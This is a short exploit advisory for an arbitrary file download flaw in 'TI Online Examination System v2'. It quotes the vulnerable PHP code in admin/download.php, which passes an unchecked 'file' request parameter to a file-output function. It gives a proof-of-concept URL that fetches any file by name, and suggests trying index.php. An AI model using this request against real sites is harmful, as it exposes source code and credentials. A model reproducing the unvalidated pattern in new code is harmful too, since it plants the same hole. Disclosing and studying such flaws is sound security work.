# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
# Vendor Homepage: https://codecanyon.net/item/ti-online-examination-system-v2/11248904
# Version: 2.0
# Category: Webapps
# Tested on: Kali linux
# Description : The "Export" operation in the admin panel is vulnerable.
The attacker can download and read all files known by the name via
"download.php"
 
====================================================
 
# Demo : server/admin/
# Vuln file : /admin/download.php
 
115. $data_action    = $_REQUEST[&#039;action&#039;];
116. if($data_action == &#039;downloadfile&#039;)
117. {
118.    $file   = $_REQUEST[&#039;file&#039;];
119.    $name    = $file;
120.    $result = output_file($file, $name);
 
# PoC :
http://server/admin/download.php?action=downloadfile&file=[filename]
you can write the known file name instead of [filename]. For Example:
&#039;download.php&#039; or &#039;index.php&#039;
 
====================================================

